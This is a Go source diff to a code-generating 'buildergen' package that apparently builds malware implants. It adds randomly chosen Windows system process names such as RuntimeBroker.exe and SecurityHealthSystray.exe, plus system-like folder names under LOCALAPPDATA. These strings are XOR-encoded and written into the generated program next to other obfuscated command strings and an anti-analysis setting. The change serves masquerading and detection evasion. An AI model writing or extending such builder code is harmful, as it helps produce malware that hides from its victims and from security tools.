@@ -2,7 +2,9 @@ package buildergen
 
 import (
 	"fmt"
+	"math/rand"
 	"strings"
+	"time"
 )
 
 type globalValues struct {
@@ -121,8 +123,39 @@ type globalValues struct {
 	EncSysctlCmd        string
 	EncSysctlNameArg    string
 	EncXdgOpen          string
+	EncDisguisedExeName string
+	EncDisguiseDir      string
+	EncLocalAppDataEnv  string
 	AntiAnalysisMode    string
 	XorKeyLiteral       string
+}
+
+var disguiseNames = []string{
+	"RuntimeBroker.exe",
+	"SearchHost.exe",
+	"SecurityHealthSystray.exe",
+	"TextInputHost.exe",
+	"ShellExperienceHost.exe",
+	"ApplicationFrameHost.exe",
+	"SystemSettings.exe",
+	"UserOOBEBroker.exe",
+}
+
+var disguiseDirs = []string{
+	"WindowsApps",
+	"SystemAppData",
+	"CloudStore",
+	"IdentityService",
+}
+
+func pickDisguiseName() string {
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	return disguiseNames[r.Intn(len(disguiseNames))]
+}
+
+func pickDisguiseDir() string {
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	return disguiseDirs[r.Intn(len(disguiseDirs))]
 }
 
 func buildGlobals(cfg Config) (globalValues, error) {
@@ -255,6 +288,9 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		EncSysctlCmd:      xorWithKey("sysctl", key),
 		EncSysctlNameArg:  xorWithKey("-n", key),
 		EncXdgOpen:        xorWithKey("xdg-open", key),
+		EncDisguisedExeName: xorWithKey(pickDisguiseName(), key),
+		EncDisguiseDir:      xorWithKey(pickDisguiseDir(), key),
+		EncLocalAppDataEnv:  xorWithKey("LOCALAPPDATA", key),
 		AntiAnalysisMode:  strings.TrimSpace(cfg.AntiAnalysis),
 		XorKeyLiteral:     escapeGoString(key),
 	}, nil
@@ -390,6 +426,9 @@ var encDashCArg = []byte{%s}
 var encSysctlCmd = []byte{%s}
 var encSysctlNameArg = []byte{%s}
 var encXdgOpen = []byte{%s}
+var encDisguisedExeName = []byte{%s}
+var encDisguiseDir = []byte{%s}
+var encLocalAppDataEnv = []byte{%s}
 
 var decryptionKey = []byte("%s")
 `,
@@ -510,6 +549,9 @@ var decryptionKey = []byte("%s")
 		g.EncSysctlCmd,
 		g.EncSysctlNameArg,
 		g.EncXdgOpen,
+		g.EncDisguisedExeName,
+		g.EncDisguiseDir,
+		g.EncLocalAppDataEnv,
 		g.XorKeyLiteral,
 	)), nil
 }
